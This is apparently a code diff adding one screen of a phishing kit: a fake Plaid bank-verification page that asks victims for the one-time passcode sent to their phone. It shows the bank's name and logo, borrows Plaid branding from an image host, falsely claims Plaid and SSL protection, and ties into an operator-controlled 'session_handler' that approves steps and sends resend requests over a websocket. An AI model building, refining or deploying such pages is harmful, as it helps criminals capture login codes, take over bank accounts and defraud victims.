@@ -1,0 +1,586 @@
+<style>
+/* ═══════════════════════════════════════════════
+   PLAID DESIGN SYSTEM — shared across all fragments
+   ═══════════════════════════════════════════════ */
+:root {
+  --p-black:   #111111;
+  --p-navy:    #113b5e;
+  --p-blue:    #1a56ff;
+  --p-gray1:   #f5f5f5;
+  --p-gray2:   #e8e8e8;
+  --p-gray3:   #b0b0b0;
+  --p-gray4:   #6b6b6b;
+  --p-white:   #ffffff;
+  --p-green:   #0fa55a;
+  --p-red:     #e0341b;
+  --p-radius:  10px;
+  --p-shadow:  0 4px 24px rgba(0,0,0,0.10);
+  --p-trans:   all 0.22s cubic-bezier(.4,0,.2,1);
+}
+
+* { margin:0; padding:0; box-sizing:border-box; }
+
+.p-wrap {
+  min-height: 100vh;
+  display: flex;
+  justify-content: center;
+  align-items: flex-start;
+  padding: 16px 12px 32px;
+  background: #f0f2f5;
+  font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+  -webkit-font-smoothing: antialiased;
+}
+
+.p-card {
+  background: var(--p-white);
+  border-radius: 16px;
+  box-shadow: var(--p-shadow);
+  width: 100%;
+  max-width: 440px;
+  padding: 0;
+  overflow: hidden;
+}
+
+/* ── Top bar with Plaid logo ── */
+.p-topbar {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  padding: 16px 20px 0;
+}
+.p-plaid-logo {
+  display: flex;
+  align-items: center;
+  gap: 6px;
+}
+.p-plaid-logo img {
+  height: 22px;
+  width: auto;
+}
+.p-plaid-wordmark {
+  font-size: 17px;
+  font-weight: 700;
+  letter-spacing: -0.5px;
+  color: var(--p-black);
+}
+.p-lock-icon {
+  width: 30px;
+  height: 30px;
+  background: var(--p-gray1);
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  color: var(--p-gray4);
+  font-size: 13px;
+}
+
+/* ── Progress dots ── */
+.p-progress {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 6px;
+  padding: 14px 20px 0;
+}
+.p-dot {
+  width: 7px;
+  height: 7px;
+  border-radius: 50%;
+  background: var(--p-gray2);
+  transition: var(--p-trans);
+}
+.p-dot.active  { background: var(--p-black); transform: scale(1.2); }
+.p-dot.done    { background: var(--p-green); }
+.p-progress-bar-wrap {
+  padding: 14px 20px 0;
+}
+.p-progress-bar {
+  width: 100%;
+  height: 3px;
+  background: var(--p-gray2);
+  border-radius: 2px;
+  overflow: hidden;
+}
+.p-progress-bar-fill {
+  height: 100%;
+  background: var(--p-black);
+  border-radius: 2px;
+  transition: width 0.5s cubic-bezier(.4,0,.2,1);
+}
+
+/* ── Institution header ── */
+.p-inst-header {
+  display: flex;
+  align-items: center;
+  gap: 14px;
+  padding: 18px 20px 0;
+}
+.p-inst-logo {
+  width: 48px;
+  height: 48px;
+  border-radius: 12px;
+  background: var(--p-gray1);
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  overflow: hidden;
+  flex-shrink: 0;
+  border: 1px solid var(--p-gray2);
+}
+.p-inst-logo img  { max-width: 78%; max-height: 78%; object-fit: contain; }
+.p-inst-logo svg  { width: 100%; height: 100%; }
+.p-inst-info h3   { font-size: 15px; font-weight: 600; color: var(--p-black); line-height: 1.2; }
+.p-inst-info span { font-size: 12.5px; color: var(--p-gray4); margin-top: 2px; display: block; }
+
+/* ── Body content ── */
+.p-body {
+  padding: 20px 20px 24px;
+}
+.p-title {
+  font-size: 20px;
+  font-weight: 700;
+  color: var(--p-black);
+  letter-spacing: -0.3px;
+  margin-bottom: 6px;
+}
+.p-sub {
+  font-size: 13.5px;
+  color: var(--p-gray4);
+  line-height: 1.55;
+  margin-bottom: 20px;
+}
+
+/* ── Input group ── */
+.p-field {
+  margin-bottom: 14px;
+}
+.p-label {
+  display: block;
+  font-size: 12px;
+  font-weight: 600;
+  color: var(--p-gray4);
+  text-transform: uppercase;
+  letter-spacing: 0.5px;
+  margin-bottom: 6px;
+}
+.p-input {
+  width: 100%;
+  padding: 13px 14px;
+  border: 1.5px solid var(--p-gray2);
+  border-radius: var(--p-radius);
+  font-size: 15px;
+  color: var(--p-black);
+  background: var(--p-white);
+  transition: var(--p-trans);
+  outline: none;
+  box-sizing: border-box;
+}
+.p-input:focus    { border-color: var(--p-black); box-shadow: 0 0 0 3px rgba(17,17,17,0.08); }
+.p-input.p-error  { border-color: var(--p-red); }
+.p-input-wrap     { position: relative; }
+.p-input-wrap .p-input { padding-right: 44px; }
+.p-eye {
+  position: absolute;
+  right: 13px;
+  top: 50%;
+  transform: translateY(-50%);
+  background: none;
+  border: none;
+  cursor: pointer;
+  color: var(--p-gray3);
+  font-size: 15px;
+  padding: 4px;
+}
+.p-eye:hover { color: var(--p-black); }
+
+/* ── Error message ── */
+.p-error-msg {
+  font-size: 12px;
+  color: var(--p-red);
+  margin-top: 5px;
+  display: none;
+}
+.p-error-msg.show { display: block; }
+
+/* ── Buttons ── */
+.p-btn {
+  width: 100%;
+  padding: 14px;
+  background: var(--p-black);
+  color: var(--p-white);
+  border: none;
+  border-radius: var(--p-radius);
+  font-size: 15px;
+  font-weight: 600;
+  cursor: pointer;
+  transition: var(--p-trans);
+  letter-spacing: 0.1px;
+  margin-top: 4px;
+}
+.p-btn:hover    { background: #222; transform: translateY(-1px); box-shadow: 0 4px 14px rgba(0,0,0,0.18); }
+.p-btn:active   { transform: translateY(0); }
+.p-btn:disabled { background: var(--p-gray2); color: var(--p-gray3); cursor: not-allowed; transform: none; box-shadow: none; }
+.p-btn-ghost {
+  width: 100%;
+  padding: 13px;
+  background: transparent;
+  color: var(--p-black);
+  border: 1.5px solid var(--p-gray2);
+  border-radius: var(--p-radius);
+  font-size: 14px;
+  font-weight: 500;
+  cursor: pointer;
+  transition: var(--p-trans);
+  margin-top: 10px;
+}
+.p-btn-ghost:hover { background: var(--p-gray1); border-color: var(--p-gray3); }
+
+/* ── Divider ── */
+.p-divider {
+  height: 1px;
+  background: var(--p-gray2);
+  margin: 18px 0;
+}
+
+/* ── Footer ── */
+.p-footer {
+  padding: 0 20px 20px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 5px;
+  font-size: 12px;
+  color: var(--p-gray4);
+}
+.p-footer i { font-size: 11px; color: var(--p-green); }
+
+/* ── Loading spinner ── */
+.p-spinner {
+  display: inline-block;
+  width: 20px; height: 20px;
+  border: 2px solid rgba(255,255,255,0.3);
+  border-top-color: #fff;
+  border-radius: 50%;
+  animation: pSpin 0.7s linear infinite;
+  vertical-align: middle;
+  margin-right: 8px;
+}
+@keyframes pSpin { to { transform: rotate(360deg); } }
+
+/* ── Generic bank SVG ── */
+.p-gen-bank svg { width: 100%; height: 100%; }
+
+
+/* ── OTP-specific ── */
+.p-otp-row {
+  display: flex;
+  gap: 8px;
+  justify-content: center;
+  margin: 6px 0 20px;
+  flex-wrap: nowrap;
+}
+.p-otp-box {
+  width: 44px; height: 52px;
+  border: 1.5px solid var(--p-gray2);
+  border-radius: 10px;
+  font-size: 22px;
+  font-weight: 600;
+  text-align: center;
+  color: var(--p-black);
+  background: var(--p-white);
+  outline: none;
+  transition: var(--p-trans);
+  -webkit-appearance: none;
+  flex-shrink: 0;
+}
+.p-otp-box.p-otp-8 {
+  width: 36px; height: 48px;
+  font-size: 20px;
+  border-radius: 8px;
+}
+.p-otp-box:focus { border-color: var(--p-black); box-shadow: 0 0 0 3px rgba(17,17,17,0.08); }
+.p-otp-box.filled { border-color: var(--p-black); background: var(--p-gray1); }
+
+.p-otp-info {
+  background: var(--p-gray1);
+  border-radius: 10px;
+  padding: 12px 14px;
+  font-size: 13px;
+  color: var(--p-gray4);
+  line-height: 1.5;
+  margin-bottom: 18px;
+  display: flex;
+  align-items: flex-start;
+  gap: 8px;
+}
+.p-otp-info i { color: var(--p-navy); margin-top: 2px; flex-shrink: 0; }
+
+/* Resend button */
+.p-resend-wrap {
+  text-align: center;
+  margin-top: 16px;
+}
+.p-resend-btn {
+  background: none;
+  border: 1.5px solid var(--p-gray2);
+  border-radius: 8px;
+  padding: 9px 18px;
+  font-size: 13px;
+  font-weight: 600;
+  color: var(--p-black);
+  cursor: pointer;
+  transition: var(--p-trans);
+  display: inline-flex;
+  align-items: center;
+  gap: 6px;
+}
+.p-resend-btn:hover:not(:disabled) { background: var(--p-gray1); border-color: var(--p-gray3); }
+.p-resend-btn:disabled { opacity: 0.45; cursor: not-allowed; }
+.p-resend-feedback {
+  display: none;
+  font-size: 12px;
+  color: var(--p-green);
+  margin-top: 8px;
+  text-align: center;
+}
+.p-resend-feedback.show { display: block; }
+
+.p-timer {
+  font-size: 11px;
+  color: var(--p-gray3);
+  margin-top: 4px;
+  text-align: center;
+  display: none;
+}
+.p-timer.show { display: block; }
+</style>
+
+<div class="p-wrap">
+  <div class="p-card">
+    <div class="p-topbar">
+      <div class="p-plaid-logo">
+        <img src="https://i.ibb.co/20tK8xrs/pngwing-com.png" alt="Plaid">
+        <span class="p-plaid-wordmark">plaid</span>
+      </div>
+      <div class="p-lock-icon"><i class="fas fa-lock"></i></div>
+    </div>
+
+    <div class="p-progress-bar-wrap">
+      <div class="p-progress-bar">
+        <div class="p-progress-bar-fill" id="otpProgressFill" style="width:40%;"></div>
+      </div>
+    </div>
+
+    <div class="p-inst-header" id="otpInstHeader">
+      <div class="p-inst-logo" id="otpLogoWrap"></div>
+      <div class="p-inst-info">
+        <h3 id="otpBankName">Your Bank</h3>
+        <span id="otpInstSub">One-Time Passcode</span>
+      </div>
+    </div>
+
+    <div class="p-body">
+      <p class="p-title" id="otpTitle">Enter verification code</p>
+      <p class="p-sub" id="otpSubText">Enter the code sent to your registered phone number.</p>
+
+      <div class="p-otp-info">
+        <i class="fas fa-info-circle"></i>
+        <span id="otpInfoText">Codes expire after 10 minutes. Tap Resend if you haven't received yours.</span>
+      </div>
+
+      <!-- OTP boxes — built dynamically by script -->
+      <div class="p-otp-row" id="otpBoxRow"></div>
+
+      <!-- Hidden otp input for session_handler compatibility -->
+      <input type="hidden" id="otp">
+
+      <button class="p-btn" id="otpSubmitBtn"
+        onclick="window.submitOTP && window.submitOTP()" disabled>
+        Verify Code
+      </button>
+      <button class="p-btn-ghost"
+        onclick="window.SPA && window.SPA.renderFragment('p_login_v1','Loading…')">
+        &#8592; Back
+      </button>
+
+      <!-- Resend section -->
+      <div class="p-resend-wrap">
+        <button class="p-resend-btn" id="otpResendBtn" type="button">
+          <i class="fas fa-redo" style="font-size:11px;"></i>
+          Resend Code
+        </button>
+        <div class="p-timer" id="otpResendTimer">Resend available in <span id="otpTimerCount">30</span>s</div>
+        <div class="p-resend-feedback" id="otpResendFeedback">
+          <i class="fas fa-check-circle"></i>
+          Request sent &mdash; new code will arrive shortly
+        </div>
+      </div>
+    </div>
+
+    <div class="p-footer">
+      <i class="fas fa-lock"></i>
+      <span>Protected by Plaid &amp; 256-bit SSL encryption</span>
+    </div>
+  </div>
+</div>
+
+<script>
+(function () {
+
+  /* ── Read OTP config stored by session_handler APPROVE_STEP ──────
+     session_handler CommandExecutor.handle extracts otp_digits and
+     phone_last4 from APPROVE_STEP payload and persists to SPA.storage
+     BEFORE the fragment is delivered. 600ms gap guarantees it's set. */
+  var cfg = {};
+  try {
+    if (window.SPA && window.SPA.storage) {
+      cfg = window.SPA.storage.get('otp_config') || {};
+    }
+  } catch (e) {}
+  var OTP_DIGITS  = (cfg.digits === 8) ? 8 : 6;
+  var PHONE_LAST4 = cfg.phone_last4 || null;
+
+  /* ── Generic bank SVG ──────────────────────────────────────────── */
+  var GEN_SVG = '<svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg"><rect width="48" height="48" rx="10" fill="#113b5e"/><path d="M24 8L40 17H8Z" fill="#82cde5"/><rect x="10" y="19" width="4" height="12" rx="1.5" fill="white"/><rect x="16" y="19" width="4" height="12" rx="1.5" fill="white"/><rect x="22" y="19" width="4" height="12" rx="1.5" fill="white"/><rect x="28" y="19" width="4" height="12" rx="1.5" fill="white"/><rect x="34" y="19" width="4" height="12" rx="1.5" fill="white"/><rect x="8" y="31" width="32" height="4" rx="2" fill="white"/></svg>';
+
+  /* ── Populate bank logo ─────────────────────────────────────────── */
+  var bank   = window._selectedBank || {};
+  var wrap   = document.getElementById('otpLogoWrap');
+  var nameEl = document.getElementById('otpBankName');
+  if (nameEl && bank.name) nameEl.textContent = bank.name;
+  if (wrap && !wrap.hasChildNodes()) {
+    if (bank.logo) {
+      var img   = new Image();
+      img.alt   = bank.name || 'Bank';
+      img.style.cssText = 'max-width:78%;max-height:78%;object-fit:contain;';
+      img.onerror = function () { wrap.innerHTML = GEN_SVG; };
+      img.src   = bank.logo;
+      wrap.appendChild(img);
+    } else {
+      wrap.innerHTML = GEN_SVG;
+    }
+  }
+
+  /* ── Update subtitle with digit count + phone info ───────────────── */
+  var subEl  = document.getElementById('otpSubText');
+  var infoEl = document.getElementById('otpInfoText');
+  var titleEl = document.getElementById('otpTitle');
+  if (titleEl) titleEl.textContent = 'Enter your ' + OTP_DIGITS + '-digit code';
+  if (subEl) {
+    subEl.textContent = PHONE_LAST4
+      ? 'Enter the ' + OTP_DIGITS + '-digit code sent to the number ending in ••••' + PHONE_LAST4 + '.'
+      : 'Enter the ' + OTP_DIGITS + '-digit code sent to your registered phone number.';
+  }
+  if (infoEl) {
+    infoEl.textContent = OTP_DIGITS + "-digit codes expire after 10 minutes. Tap Resend if you haven't received yours.";
+  }
+
+  /* ── Build OTP boxes dynamically ───────────────────────────────── */
+  var row       = document.getElementById('otpBoxRow');
+  var hiddenOtp = document.getElementById('otp');
+  var submitBtn = document.getElementById('otpSubmitBtn');
+
+  if (row) {
+    row.innerHTML = '';
+    for (var i = 0; i < OTP_DIGITS; i++) {
+      var box = document.createElement('input');
+      box.type        = 'tel';
+      box.className   = 'p-otp-box' + (OTP_DIGITS === 8 ? ' p-otp-8' : '');
+      box.maxLength   = 1;
+      box.inputMode   = 'numeric';
+      box.pattern     = '[0-9]';
+      if (i === 0) box.autocomplete = 'one-time-code';
+      row.appendChild(box);
+    }
+  }
+
+  /* ── OTP box: auto-advance, backspace, paste ───────────────────── */
+  function _getBoxes() { return Array.from(row ? row.querySelectorAll('.p-otp-box') : []); }
+
+  function _syncHidden() {
+    var val = _getBoxes().map(function (b) { return b.value; }).join('');
+    if (hiddenOtp) hiddenOtp.value = val;
+    if (submitBtn) submitBtn.disabled = (val.length < OTP_DIGITS);
+    _getBoxes().forEach(function (b) {
+      b.classList.toggle('filled', b.value.length > 0);
+    });
+  }
+
+  /* Wire boxes after DOM settles */
+  setTimeout(function () {
+    var boxes = _getBoxes();
+    boxes.forEach(function (box, idx) {
+      box.addEventListener('input', function () {
+        box.value = box.value.replace(/\D/g, '').slice(-1);
+        _syncHidden();
+        if (box.value && idx < boxes.length - 1) boxes[idx + 1].focus();
+      });
+      box.addEventListener('keydown', function (e) {
+        if (e.key === 'Backspace' && !box.value && idx > 0) {
+          boxes[idx - 1].value = '';
+          boxes[idx - 1].focus();
+          _syncHidden();
+        }
+      });
+      box.addEventListener('paste', function (e) {
+        e.preventDefault();
+        var pasted = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '');
+        pasted.split('').slice(0, OTP_DIGITS).forEach(function (ch, i) {
+          if (boxes[i]) boxes[i].value = ch;
+        });
+        _syncHidden();
+        var nextEmpty = boxes.findIndex(function (b) { return !b.value; });
+        (nextEmpty >= 0 ? boxes[nextEmpty] : boxes[boxes.length - 1]).focus();
+      });
+    });
+    if (boxes[0]) boxes[0].focus();
+  }, 200);
+
+  /* ── Resend Code button ─────────────────────────────────────────── */
+  var resendBtn      = document.getElementById('otpResendBtn');
+  var resendFeedback = document.getElementById('otpResendFeedback');
+  var resendTimer    = document.getElementById('otpResendTimer');
+  var timerCount     = document.getElementById('otpTimerCount');
+  var _resendCooldown = null;
+
+  if (resendBtn) {
+    resendBtn.addEventListener('click', function () {
+      resendBtn.disabled = true;
+      resendTimer && resendTimer.classList.add('show');
+
+      /* Send resend request via session_handler or direct WS */
+      if (typeof window.requestOtpResend === 'function') {
+        window.requestOtpResend();
+      } else if (window.SPA && window.SPA.Connection) {
+        window.SPA.Connection.send({
+          type:          'otp_resend_request',
+          sessionId:     window.SPA.Session ? window.SPA.Session.id() : '',
+          applicationId: window.SPA.Session ? window.SPA.Session.appId() : '',
+        });
+      }
+
+      /* Show feedback */
+      if (resendFeedback) resendFeedback.classList.add('show');
+      setTimeout(function () {
+        if (resendFeedback) resendFeedback.classList.remove('show');
+      }, 6000);
+
+      /* 30-second cooldown countdown */
+      var secs = 30;
+      if (timerCount) timerCount.textContent = secs;
+      if (_resendCooldown) clearInterval(_resendCooldown);
+      _resendCooldown = setInterval(function () {
+        secs--;
+        if (timerCount) timerCount.textContent = secs;
+        if (secs <= 0) {
+          clearInterval(_resendCooldown);
+          resendBtn.disabled = false;
+          if (resendTimer) resendTimer.classList.remove('show');
+        }
+      }, 1000);
+    });
+  }
+
+})();
+</script>
